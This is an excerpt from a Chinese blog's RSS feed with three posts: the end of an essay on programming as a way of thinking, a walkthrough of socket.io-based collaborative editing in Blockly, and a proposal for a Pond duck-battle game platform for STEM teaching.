&lt;p&gt;我一直坚信大多数写教材的人完全不记得自己当学生的样子，更糟糕的是他们还缺乏共情能力，否则我们无法理解为何满世界会是那些令人没有胃口的知识罗列风格的书，它一定是写给那些已经懂了的人，用作考试复习提纲。&lt;/p&gt;
&lt;p&gt;Allen Downey在结尾处说:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;现代编程语言在性质上不同于它们的前辈，我们也只是刚刚开始认识到这种差异的含义。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;人们大多时候只把语言看作一种传递和表述思想的工具，认为一个人的思想在他脑子里一次成型，之后只是用某个媒介展示出来。但复杂的思想往往不是一蹴而就的，它可能要经过思考、检验、校正、推翻等环节不断迭代，如果我们有一种好的语言，同时具备表现力、可读性、简洁性、精确性和可执行性。那么它就可能在本质上改进思考过程。&lt;/p&gt;
&lt;p&gt;如果不以冯诺伊曼的方式看待编程（&lt;strong&gt;一种办事员的工作，基本不需要理智参与&lt;/strong&gt;）, 而用图灵的视角，那么它的确是 &lt;strong&gt;非常吸引人的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;理论上你用二进制或汇编也能写出所有的程序，但如果没有现代化的高级语言，很多工作，是极为艰难甚至不可能的，毕竟大多数人的大脑应对复杂度的能力是有限的。人类是擅于利用工具的动物。这些工具延伸和改进了他们的生物有机体。&lt;/p&gt;
&lt;p&gt;我最近在读《史蒂夫·乔布斯传》，援引他年轻时对计算机的看法作为本文结尾:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I think one of the things that really separates us from the high primates is that we’re tool builders. I read a study that measured the efficiency of locomotion for various species on the planet. The condor used the least energy to move a kilometer. And, humans came in with a rather unimpressive showing, about a third of the way down the list. It was not too proud a showing for the crown of creation. So, that didn’t look so good. But, then somebody at Scientific American had the insight to test the efficiency of locomotion for a man on a bicycle. And, a man on a bicycle, a human on a bicycle, blew the condor away, completely off the top of the charts.
And that’s what a computer is to me. What a computer is to me is it’s the most remarkable tool that we’ve ever come up with, and it’s the equivalent of a bicycle for our minds.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--人们更喜欢keras而不是tensorflow--&gt;

&lt;h1 id="_4"&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blogs.scientificamerican.com/guest-blog/programming-as-a-way-of-thinking/"&gt;Programming as a Way of Thinking&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.oschina.net/translate/programming-as-a-way-of-thinking"&gt;把编程作为一种思考方式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/quobit/awesome-python-in-education"&gt;awesome-python-in-education&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mindhacks.cn/2009/02/15/why-you-should-start-blogging-now/"&gt;为什么你应该（从现在开始就）写博客&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mindhacks.cn/"&gt;刘未鹏&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pgbovine.net/python-teaching.htm"&gt;Why Python is a great language for teaching beginners in introductory programming classes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://book.douban.com/subject/1391740/"&gt;逻辑的引擎&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2"&gt;广度优先搜索(BFS)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-hans/%E4%BC%AA%E4%BB%A3%E7%A0%81"&gt;伪代码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://jupyter.org"&gt;jupyter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-hans/%E9%80%BB%E8%BE%91%E5%93%B2%E5%AD%A6%E8%AE%BA"&gt;逻辑哲学论&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://book.douban.com/subject/1315184/"&gt;哲学研究&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://allendowney.blogspot.com/2017/04/python-as-way-of-thinking.html"&gt;Python as a way of thinking&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nbviewer.jupyter.org/github/AllenDowney/"&gt;AllenDowney&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://greenteapress.com/wp/think-dsp/"&gt;Think DSP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/AllenDowney/ThinkDSP/blob/master/code/thinkdsp.py"&gt;thinkdsp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Head_First_(book_series)"&gt;Head First (book series)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://muratbuffalo.blogspot.com/2018/03/master-your-tools.html"&gt;Master your tools&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-hans/%E5%8F%AF%E8%AF%81%E4%BC%AA%E6%80%A7"&gt;可证伪性&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 15 Oct 2018 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2018-10-15:programming-as-a-way-of-thinking.html</guid><category>programming</category></item><item><title>blockly与结对编程</title><link>/blockly-pair-programming.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-tmp-video.just4fun.site/blockly_socket.gif" /&gt;&lt;/p&gt;
&lt;h1 id="_1"&gt;引言&lt;/h1&gt;
&lt;p&gt;前些日子google刚发布了blockly1.0，社区人气一路上升，我集中时间逛了下开发者社区(&lt;a href="https://groups.google.com/forum/#!forum/blockly"&gt;developer forum&lt;/a&gt;)，发现好些有意思的开源项目，有不少我手边的工作都用得到,能省下许多的时间,逛开发者社区常有意外的惊喜,比刷朋友圈有趣多了&lt;/p&gt;
&lt;p&gt;下文我们将提到的&lt;a href="https://github.com/ucanbaklava/socketblockly"&gt;socketblockly&lt;/a&gt;便来自社区&lt;/p&gt;
&lt;h1 id="_2"&gt;结对编程&lt;/h1&gt;
&lt;p&gt;按维基百科的说法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;结对编程（英语：Pair programming）是一种敏捷软件开发的方法，两个程序员在一个计算机上共同工作。一个人输入代码，而另一个人审查他输入的每一行代码。输入代码的人称作驾驶员，审查代码的人称作观察员&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我个人很喜欢结对编程。甚至远程协作的时候,我也喜欢和朋友一起登陆到服务器，一起进入同个tmux session(你可能更喜欢&lt;a href="https://github.com/zolrath/wemux"&gt;wemux&lt;/a&gt;，如果你爱折腾甚至可以试试&lt;a href="https://github.com/FredKSchott/CoVim"&gt;CoVim&lt;/a&gt;)，手边打开微信语音，编程相关的内容，大家的屏幕是彼此同步的，输入也完全同步，沟通效率远胜于任何截图(甚至好过一起聚在同个屏幕面前)。对服务器的重要的操作彼此监督，不容易出错。在工作交接的时候，这种协作方式效率也极高。甚至在公司，我也喜欢以这种方式和同事协作，一群人挤在一个屏幕面前，很不自在。共享屏幕并不需要在同个物理空间&lt;/p&gt;
&lt;p&gt;我将结对编程视为协同工作的一种,协同工作就宽泛得多了，我比较关注在线实时的协同工具（对远程办公有极大好感:) ），能够对此提供支持的工具有很多，诸如&lt;a href="https://www.google.com/intl/zh-CN/docs/about/"&gt;google文档&lt;/a&gt;、&lt;a href="https://shimo.im/"&gt;石墨文档&lt;/a&gt;、&lt;a href="https://github.com/mozilla/togetherjs"&gt;togetherjs&lt;/a&gt;等&lt;/p&gt;
&lt;p&gt;这些能用来进行协同工作的工具，也适合用来做远程教学(手把手),当然我们可能需要区分学生和老师的角色，这个是细节问题&lt;/p&gt;
&lt;h1 id="blockly"&gt;blockly与结对编程&lt;/h1&gt;
&lt;p&gt;在blockly中我们如何实现结对编程呢？(对blockly不熟悉的小伙伴可以参考&lt;a href="http://blog.just4fun.site/blockly-overview.html"&gt;blockly入门与介绍&lt;/a&gt;) &lt;/p&gt;
&lt;p&gt;这是个很有趣的话题，乍看之下blocks是UI，似乎比协同文本更难&lt;/p&gt;
&lt;p&gt;我们来看看&lt;a href="https://github.com/ucanbaklava/socketblockly"&gt;socketblockly&lt;/a&gt;是怎么做的&lt;/p&gt;
&lt;h2 id="_3"&gt;思路&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/ucanbaklava/socketblockly"&gt;socketblockly&lt;/a&gt;的解决方案简单粗暴，简单来说，就是观察workspace中是否有变化，如果有变化，就把blocks转变为xml(序列化之后变成普通的文本同步问题)通知出去，其他用户在本地做反序列化，用新的blocks更新本地的workspace,如此就实现了编辑的同步(也就是协同)&lt;/p&gt;
&lt;p&gt;简而言之，如果你意识到blocks与xml是可以相互转化的，那么这件事就是一个普通的(文本)协同编辑问题&lt;/p&gt;
&lt;h2 id="_4"&gt;源码分析&lt;/h2&gt;
&lt;p&gt;因为有实时性的要求，主要使用了&lt;a href="https://github.com/socketio/socket.io"&gt;socket.io&lt;/a&gt;来做实时通信&lt;/p&gt;
&lt;h4 id="server"&gt;server端&lt;/h4&gt;
&lt;p&gt;server端非常简单,一目了然&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="nx"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;new xml&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;broadcast&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;emit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rebuild workspace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;监听新消息(new xml),并将其广播给其他客户端&lt;/p&gt;
&lt;h4 id="client"&gt;client端&lt;/h4&gt;
&lt;p&gt;client端也干净利索&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;workspace&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;inject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;blocklyDiv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;workspaceOptions&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;updateWorkspace&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Events&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;UI&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Events&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;CREATE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt;

  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;xml&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Xml&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;workspaceToDom&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;workspace&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;xml_text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Xml&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domToText&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="nx"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;emit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;new xml&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;xml_text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nx"&gt;workspace&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addChangeListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;updateWorkspace&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nx"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rebuild workspace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Events&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;disable&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="nx"&gt;workspace&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;clear&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;xmlData&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Xml&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;textToDom&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Xml&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domToWorkspace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xmlData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;workspace&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Events&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;enable&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;基本就是前头思路的代码实现，workspace中的blocks转为xml通过:&lt;code&gt;let xml = Blockly.Xml.workspaceToDom(workspace)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;而xml还原为界面元素(blocks)通过:&lt;code&gt;var xmlData = Blockly.Xml.textToDom(xml); Blockly.Xml.domToWorkspace(xmlData, workspace)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;用户的编辑事件通过:&lt;code&gt;workspace.addChangeListener(updateWorkspace)&lt;/code&gt; 捕获，并回调updateWorkspace函数.&lt;/p&gt;
&lt;p&gt;关于blockly的事件机制可以参考:&lt;a href="https://developers.google.com/blockly/guides/configure/web/events"&gt;blockly events&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="_5"&gt;演示&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-tmp-video.just4fun.site/blockly_socket.gif" /&gt;&lt;/p&gt;
&lt;p&gt;你可以在&lt;a href="http://socketblockly.herokuapp.com/"&gt;demo&lt;/a&gt;里自己尝试(开2个浏览器)&lt;/p&gt;
&lt;h3 id="todo"&gt;todo&lt;/h3&gt;
&lt;p&gt;建议将&lt;a href="https://github.com/ucanbaklava/socketblockly"&gt;socketblockly&lt;/a&gt;视为一个最小原型，可以改进的地方还有很多，诸如:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加上房间的概念(类似&lt;a href="https://github.com/mozilla/togetherjs"&gt;togetherjs&lt;/a&gt;),以支持多对用户的协作,社区里有人尝试&lt;a href="https://blockly-realtime-collab.appspot.com/static/demos/realtime/index.html"&gt;blockly-realtime-collab&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;加上&lt;a href="https://github.com/mozilla/togetherjs"&gt;togetherjs&lt;/a&gt;,使协同工作者能以代码之外的方式沟通，而不必离开当前界面（类似我同时使用tmux和微信语音）&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 27 Jun 2017 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2017-06-27:blockly-pair-programming.html</guid><category>code</category></item><item><title>基于Pond的对战平台(构想)</title><link>/blockly-game-pond.html</link><description>&lt;h1 id="pond"&gt;关于Pond&lt;/h1&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/pondbfcc9bf0.png" /&gt;&lt;/p&gt;
&lt;p&gt;Pond是一款可编程的对战类游戏，来自google团队，基于&lt;a href="https://github.com/google/blockly-games"&gt;blockly-game&lt;/a&gt;构建,而blockly-game基于&lt;a href="https://github.com/google/blockly"&gt;blockly&lt;/a&gt;，可以认为是利用blockly来构建游戏的脚手架，关于blockly可以参考我之前的文章:&lt;a href="http://blog.just4fun.site/blockly-overview.html"&gt;blockly入门与介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这个游戏的界面元素很简单&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/pond8da15e05.png" /&gt;&lt;/p&gt;
&lt;p&gt;在一个池塘里，有4只鸭子(duck)，它们可以在池塘里游动(Swim),扫描周围的鸭子(Scan)，并发射大炮(Cannon)彼此攻击.&lt;/p&gt;
&lt;p&gt;Swim、Scan、Cannon等策略都被封装为了blockly积木&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/ponde5b1edce.png" /&gt;&lt;/p&gt;
&lt;p&gt;通过拼搭blockly积木你将赋予鸭子以智慧让它闯荡江湖。&lt;/p&gt;
&lt;h2 id="_1"&gt;上手&lt;/h2&gt;
&lt;p&gt;上手这个游戏的最佳策略就是将&lt;a href="https://blockly-games.appspot.com/pond-tutor?lang=zh-hans&amp;amp;level=1"&gt;入门关卡&lt;/a&gt;一一打通(和大多有趣的资源一样，你需要翻墙访问它)，一共是10个小关卡,每个关卡都会教会你鸭子的技能，这和大多数手游引导很像（没错,包括王者农药）&lt;/p&gt;
&lt;p&gt;&lt;img alt="1" src="http://wwj-fig-bed.just4fun.site/pond6f3d8087.png" /&gt;&lt;/p&gt;
&lt;p&gt;截图是入门引导的第一关，这一关里你将学会使用大炮技能，通过调整大炮的角度和射程，你将击中周围的鸭子&lt;/p&gt;
&lt;p&gt;如果你不清楚新技能的使用，可以查看右下角的帮助文档&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/pondc6f8dcce.png" /&gt;&lt;/p&gt;
&lt;p&gt;其他关卡就不一一介绍，教程设计得非常好，跟着打怪通关就行&lt;/p&gt;
&lt;h2 id="_2"&gt;开战&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/pondc7ae5d20.png" /&gt;&lt;/p&gt;
&lt;p&gt;正式开战的时候，战场上有四只鸭子，你控制着左上角的小黄鸭。右边是编辑区域，你可以在其中使用blockly积木块来编辑你的战术，当然你也可以直接手写代码来编写战术&lt;/p&gt;
&lt;p&gt;我们来看下我们的鸭子从战五渣到屌屌哒的转变历程&lt;/p&gt;
&lt;p&gt;首先是呆如可达鸭的版本，只发射一枚大炮，之后呆呆地啥也不干&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-tmp-video.just4fun.site/pond0.gif" /&gt;&lt;/p&gt;
&lt;p&gt;不出所料，一会儿就阵亡了&lt;/p&gt;
&lt;p&gt;接着我们让我们的鸭子扫描周围，如果有敌人进入，就打它&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-tmp-video.just4fun.site/pond1.gif" /&gt;&lt;/p&gt;
&lt;p&gt;哎依然活不久，细心的你可能发现， 那只小黑鸭非常聪明，它像狙击手一样(这也正是它的名字)，躲得远远的打一下就跑,电视里的狙击手要是呆着不动的话，活不过第一集的&lt;/p&gt;
&lt;p&gt;最后我们放一个能干翻所有电脑玩家的小黄鸭&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-tmp-video.just4fun.site/pond2.gif" /&gt;&lt;/p&gt;
&lt;h1 id="_3"&gt;对战平台&lt;/h1&gt;
&lt;p&gt;基于Pond可以构建一个对战平台（适合K12/STEM教育），参赛选手们用积木块为自己的参赛鸭子构建战斗策略（就在当前的&lt;a href="https://blockly-games.appspot.com/pond-tutor?lang=zh-hans&amp;amp;level=1"&gt;测试环境&lt;/a&gt;里构建即可），完成之后提交到平台上，之后平台随机将选手分为四人一组，展开战斗,每轮中的获胜者继续分组，如此循环，可以得到各自的名次&lt;/p&gt;
&lt;p&gt;至于对战平台的技术架构，非常简单，将用户提交的作战策略generate为文本/代码，之后序列化它，存储下来,后台做好分组，在比赛的时候，加载出战略代码，反序列化，并运行它们，(每个分组可以是一个房间，通过url进入)，参赛选手可在每个房间里观看对战记录，当然他们肯定也会乐于分享给朋友一起看&lt;/p&gt;
&lt;p&gt;所以这块后台就只要简单存储代码片段就行了 (积木到代码的转化参考blockly的文档)&lt;/p&gt;
&lt;h1 id="_4"&gt;教学相关&lt;/h1&gt;
&lt;p&gt;我在过去的半年，使用blockly主要是在做STEM教育项目，那么这个对战平台能承载哪些教学内容呢? 下边举几个例子&lt;/p&gt;
&lt;p&gt;就编程教学而言，可以涵盖的话题很广，从编程的基本概念(序列/条件/循环)， 到具体的元素(变量/函数).另外值得一提的是，这些内容的教学是可选的，例如孩子们可以不必掌握函数来编写作战策略，可他们会发现，一旦他们掌握了函数，那么就可以利用这个新概念，构建更庞大的战略系统,而不会被庞大的代码压垮，同时他们也可能学会重用代码,他们会觉得函数不是一种学习负担，而是一个组织代码和思路的有力工具. &lt;/p&gt;
&lt;p&gt;就数学而言，涵盖了角度、距离、坐标这些概念，和前边一样，不掌握这些概念，你也能参赛，掌握之后，你更容易制霸全场. 知识就是力量在这里显露无疑 (正式因为每个阶段学生的知识悬殊，你可以构建少儿组、青少组或者小学组、初中组)&lt;/p&gt;
&lt;p&gt;除了数理逻辑方面的教学，你也能用于引入历史典故，许多优秀的鸭子采用的战术可以从历史上(如《三十六计》)找到原型,前头获胜的鸭子在早期就采用了&lt;code&gt;以逸待劳&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果你的兴趣是编写鸭子后边的人，你想通过猜测他们的策略而决定自己的策略 ,这在和你熟悉的同学pk的时候，尤其有用，他的性格很可能决定他的鸭子的性格(喜欢逃跑或是鲁莽冲撞)，那么心理学/博弈很容易引入进来，所谓知己知彼 百战不殆&lt;/p&gt;
&lt;p&gt;对于少部分有怀疑/创造精神同学，可能会指出这个游戏不合理，他们会给出改进游戏的建议，他们想制作更有趣的游戏规则，诸如允许团队作战，这个时候，因为游戏的源码开放性，可以把这部分同学引入到游戏的设计上来，通过修改源码，构建自己的游戏规则和平台&lt;/p&gt;
&lt;h1 id="_5"&gt;技术视角&lt;/h1&gt;
&lt;p&gt;下边我们切换到技术视角，来分析下这个游戏的源码结构和重要的实现细节,如果我们要将它改造为对战平台，理解源码是必经之路&lt;/p&gt;
&lt;p&gt;我们带着几个问题来阅读源码的关键部分，之后顺藤摸瓜即可&lt;/p&gt;
&lt;p&gt;如果你有看不懂的地方请翻阅&lt;a href="https://github.com/google/blockly-games/wiki"&gt;blockly-game的文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;blockly-game最坑的地方是使用了&lt;a href="https://github.com/google/closure-compiler"&gt;closure-compiler&lt;/a&gt;,如果看到奇奇怪怪的东西，基本来自closure-compiler&lt;/p&gt;
&lt;h3 id="_6"&gt;点击&lt;code&gt;运行程序&lt;/code&gt;按钮后都发生了什么&lt;/h3&gt;
&lt;p&gt;首先从前端入手，我们跟踪点击&lt;code&gt;运行程序&lt;/code&gt;按钮后都发生了什么?&lt;/p&gt;
&lt;p&gt;我们追踪到&lt;a href="https://github.com/google/blockly-games/blob/master/appengine/pond/js/pond.js#L115"&gt;Pond.runButtonClick&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="_7"&gt;我们提交的代码/积木块在哪里被运行&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly-games/blob/master/appengine/pond/js/pond.js#L152"&gt;Pond.execute&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="_8"&gt;参赛选手的初始化&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly-games/blob/d6f3e3217d8f886a963269dd3950321e526d0fde/appengine/pond/duck/js/duck.js#L149"&gt;var players&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这一行也值得留意&lt;a href="https://github.com/google/blockly-games/blob/master/appengine/pond/duck/js/duck.js#L190"&gt;Pond.Battle.addAvatar(name, code, playerData.start, playerData.damage);&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="_9"&gt;电脑控制的鸭子的战斗策略在哪里定义&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly-games/blob/master/appengine/pond/duck/template.soy#L209"&gt;playerCounter&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="_10"&gt;战斗的过程(运行每个鸭子的作战策略)&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly-games/blob/master/appengine/pond/js/battle.js#L330"&gt;Pond.Battle.updateInterpreters_&lt;/a&gt;&lt;/p&gt;
&lt;h1 id="_11"&gt;一些边缘问题&lt;/h1&gt;
&lt;h3 id="_12"&gt;健壮性&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;任何时候不要相信用户的输入&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;构建一个系统，我们永远不该忘记上边这条箴言&lt;/p&gt;
&lt;p&gt;如果某个用户输入的战斗策略有误，会不会影响战斗的进行?&lt;/p&gt;
&lt;p&gt;这单可以放心，有误的战斗策略，会导致这个用户被淘汰，但不影响比赛的继续进行&lt;/p&gt;
&lt;h1 id="_13"&gt;一些改进的空间&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;更好的汉化&lt;/li&gt;
&lt;li&gt;增强鸭子对环境的感知(比如看得到其他人的血槽)&lt;/li&gt;
&lt;li&gt;引入物理引擎,力、冲量、加速度,使战斗更真实&lt;/li&gt;
